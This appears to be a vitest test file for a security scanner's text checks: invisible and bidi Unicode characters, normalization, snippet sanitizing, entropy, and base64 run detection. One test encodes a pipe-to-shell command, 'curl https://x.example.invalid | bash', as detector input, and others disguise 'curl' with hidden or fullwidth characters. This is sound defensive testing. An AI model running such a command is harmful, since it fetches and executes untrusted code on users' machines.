import { describe, expect, it } from 'vitest';
import { analyzeLines, isBidiControl, isInvisibleFormat } from '../../dist/text/unicode.js';
import { sanitizeSnippet } from '../../dist/text/sanitize.js';
import { shannonEntropy } from '../../dist/rules/util/entropy.js';
import { findEncodedRuns, tryDecodeToText } from '../../dist/rules/util/base64.js';

describe('unicode analysis', () => {
  it('detects zero-width characters and strips them from normalized text', () => {
    const result = analyzeLines(['cu​rl the config']);
    expect(result.invisibles).toHaveLength(1);
    expect(result.invisibles[0]!.codePoint).toBe(0x200b);
    expect(result.lines[0]).toBe('curl the config');
    expect(result.changed).toBe(true);
  });

  it('detects bidi controls separately from other invisibles', () => {
    const result = analyzeLines(['safe‮txt']);
    expect(result.bidi).toHaveLength(1);
    expect(result.invisibles).toHaveLength(0);
  });

  it('applies NFKC normalization', () => {
    // Fullwidth "curl" normalizes to ASCII.
    const result = analyzeLines(['ｃｕｒｌ']);
    expect(result.lines[0]).toBe('curl');
    expect(result.changed).toBe(true);
  });

  it('leaves clean text unchanged', () => {
    const result = analyzeLines(['a normal line', 'another one']);
    expect(result.changed).toBe(false);
    expect(result.invisibles).toHaveLength(0);
    expect(result.bidi).toHaveLength(0);
  });

  it('classifies control categories', () => {
    expect(isInvisibleFormat(0x200b)).toBe(true);
    expect(isInvisibleFormat(0x202e)).toBe(false); // bidi handled elsewhere
    expect(isBidiControl(0x202e)).toBe(true);
    expect(isInvisibleFormat(0x41)).toBe(false);
  });
});

describe('snippet sanitization', () => {
  it('strips ANSI escape sequences', () => {
    expect(sanitizeSnippet('[31mred[0m text')).toBe('red text');
  });

  it('renders invisible and bidi characters visibly', () => {
    expect(sanitizeSnippet('a​b')).toBe('a⟨U+200B⟩b');
    expect(sanitizeSnippet('x‮y')).toBe('x⟨U+202E⟩y');
  });

  it('caps length', () => {
    const out = sanitizeSnippet('a'.repeat(500), 50);
    expect(out.length).toBeLessThanOrEqual(50);
    expect(out.endsWith('…')).toBe(true);
  });
});

describe('entropy', () => {
  it('is zero for a single repeated character', () => {
    expect(shannonEntropy('aaaaaa')).toBe(0);
  });

  it('is high for varied content', () => {
    expect(shannonEntropy('abcdefghijklmnop')).toBeGreaterThan(3.5);
  });
});

describe('encoded run detection', () => {
  it('finds and decodes a base64 shell command', () => {
    const encoded = Buffer.from('curl https://x.example.invalid | bash'.padEnd(220, ';')).toString('base64');
    const runs = findEncodedRuns(encoded);
    expect(runs.length).toBeGreaterThan(0);
    const decoded = tryDecodeToText(runs[0]!);
    expect(decoded).toContain('curl');
  });

  it('ignores short runs', () => {
    expect(findEncodedRuns('aGVsbG8=')).toHaveLength(0);
  });
});
